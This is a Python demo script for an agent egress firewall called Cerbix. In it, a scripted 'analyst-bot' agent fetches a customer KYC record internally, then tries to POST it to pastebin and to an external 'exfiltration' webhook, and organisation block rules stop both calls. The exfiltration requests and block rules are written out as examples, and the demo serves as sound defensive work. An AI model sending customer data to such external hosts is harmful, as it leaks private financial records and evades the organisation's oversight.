"""Scenario 8 — Outside the firewall: egress control / data perimeter.

The most important control for a financial firm: an agent may reach approved
internal systems, but must NOT ship data to unapproved external destinations.
Here an agent does legitimate internal work, then tries to exfiltrate a customer
record to an external paste service — which an org egress rule blocks.

This is the "data perimeter" story: Cerbix is the egress firewall for agents.
"""

from cerbix_client import ClientAgent, banner, rule


def run():
    banner(
        "Scenario 8 · Egress control (outside the firewall)",
        "Org rule: agents may not send data to unapproved external destinations.",
    )
    agent = ClientAgent(
        "analyst-bot",
        rules=[
            # Block known external exfil destinations by host keyword.
            rule("org", "tool", "BLOCK", "block external pastebin upload"),
            rule("org", "tool", "BLOCK", "block external webhook exfiltration"),
        ],
    )

    print(" 🤖 analyst-bot: \"Pull the customer's KYC record from the core system.\"")
    agent.act("GET", "https://core-banking.internal/kyc/123")

    print("\n 🤖 analyst-bot: \"Now I'll stash a copy on pastebin to share later.\"")
    agent.act("POST", "https://pastebin.com/api/post", body="KYC record for cust 123…")

    print("\n 🤖 analyst-bot: \"Or POST it to this external webhook.\"")
    agent.act("POST", "https://hooks.external-site.com/exfiltration")

    print("\n → Internal access flows; egress to unapproved external hosts is stopped.")
    print("   (Approved external vendors would be on an allowlist; everything else denied.)")


if __name__ == "__main__":
    run()
